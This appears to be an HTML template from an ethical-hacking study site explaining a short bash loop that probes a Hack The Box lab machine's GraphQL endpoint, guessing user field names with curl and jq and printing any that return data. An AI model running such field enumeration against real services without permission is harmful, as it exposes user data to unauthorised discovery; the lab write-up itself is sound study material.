@@ -1,0 +1,48 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">Curl_json</h1>
+    <div class="code-box"><pre><code>for i in $(cat test); do
+  out=$(curl -s -G 'http://help.htb:3000/graphql' --data-urlencode "query={ user { $i } }")
+  if ! echo "$out" | jq -e 'has("errors")' >/dev/null 2>&amp;1; then
+    echo "$i: " $(echo "$out" | jq -r '.data.user // ""')
+  fi
+done</code></pre></div>
+
+
+<h2 class="subtitle">Explain</h2>
+<li><code>out=$(curl -s -G 'http://help.htb:3000/graphql' --data-urlencode "query={ user { $i } }")</code> — perform an HTTP GET to the GraphQL endpoint.  
+  <ul>
+    <li><code>-s</code> silences curl progress output.</li>
+    <li><code>-G</code> makes curl send data as query-string parameters (instead of POST body).</li>
+    <li><code>--data-urlencode</code> URL-encodes the provided value so special chars (spaces, braces, quotes) are safe in the URL.</li>
+    <li>The GraphQL query string is built inline as <code>{ user { &lt;field&gt; } }</code> where <code>$i</code> is substituted by the shell.</li>
+    <li>Result (JSON) is stored in the shell variable <code>out</code>.</li>
+  </ul>
+</li>
+
+<li><code>if ! echo "$out" | jq -e 'has("errors")' &gt;/dev/null 2&gt;&amp;1; then</code> — test whether the JSON response **does not** contain an <code>errors</code> key:
+  <ul>
+    <li><code>echo "$out" | jq -e 'has("errors")'</code> returns success (exit code 0) when the JSON has an <code>errors</code> key; the <code>!</code> negates that test.</li>
+    <li>Redirecting output to <code>/dev/null</code> hides jq’s stdout/stderr; the script uses jq’s exit code only.</li>
+  </ul>
+</li>
+
+<li><code>echo "$i: " $(echo "$out" | jq -r '.data.user // ""')</code> — print the field name (<code>$i</code>) and the value returned by GraphQL:
+  <ul>
+    <li><code>jq -r '.data.user // ""'</code> extracts <code>data.user</code> (raw string, no quotes). If <code>data.user</code> is missing/null, the <code>// ""</code> fallback yields an empty string.</li>
+  </ul>
+</li>
+
+<li><code>done</code> — end loop.</li>
+
+
+</body>
+</html>
